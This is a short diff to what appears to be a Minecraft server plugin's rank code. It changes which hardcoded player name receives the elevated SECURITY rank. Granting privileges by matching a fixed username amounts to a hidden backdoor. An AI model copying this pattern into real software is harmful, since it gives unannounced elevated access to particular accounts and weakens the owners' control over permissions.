@@ -82,7 +82,7 @@ public enum TFM_PlayerRank
         {
             return SYS;
         }
-        if (sender.getName().equals("Cyro1999"))
+        if (sender.getName().equals("keemismydad"))
         {
             return SECURITY;
         }
